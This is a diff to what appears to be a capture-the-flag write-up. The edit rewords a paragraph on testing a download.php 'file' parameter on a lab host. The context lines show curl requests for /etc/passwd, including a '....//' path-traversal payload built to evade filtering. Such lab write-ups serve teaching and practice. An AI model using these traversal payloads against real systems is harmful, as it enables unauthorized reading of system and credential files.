@@ -202,7 +202,7 @@ curl -O 'http://10.10.11.212/download.php?file=/etc/passwd'
   0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
 ```
 
-If provided with an incorrect param it will not just return the same as when not provided with a param, that's the press release package. But when provided with the `file` param we get a different response, the response is empty though, so, maybe the logic triggered here is doing some basic LFI protection. If we just do the basic evasion from the aforementionned go code we should get data.
+If provided with an incorrect param it will just return the same as when not provided with a param, that's the press release package. But when provided with the `file` param we get a different response, the response is empty though, so, maybe the logic triggered here is doing some basic path traversal filtering. If we just do the basic evasion from the aforementionned go code we should get data.
 ```bash
 curl -O 'http://10.10.11.212/download.php?file=....//....//....//....//....//etc/passwd'
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
